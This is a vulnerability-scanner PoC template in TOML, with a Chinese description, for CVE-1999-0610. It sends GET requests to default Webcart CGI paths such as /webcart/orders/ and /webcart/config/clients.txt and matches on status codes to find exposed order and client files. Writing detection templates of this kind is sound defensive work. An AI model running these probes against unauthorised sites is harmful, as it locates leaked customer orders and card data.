[info]
author = "ave"
description = "检测 Webcart CGI 默认安装下敏感目录和文件是否可公开访问，包括 /webcart/orders/、/webcart/config/、/webcart/carts/ 等路径。若可访问则可能泄露用户订单、信用卡号等敏感信息。"
id = "POC-AVE-1999-0183"
name = "Webcart CGI 配置不当信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-0183"]
vuln_id = [
    "CVE-1999-0610",
    "AVE-1999-0183",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart/orders/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart/config/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart/carts/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart/config/clients.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart-lite/config/clients.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webcart-lite/orders/import.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
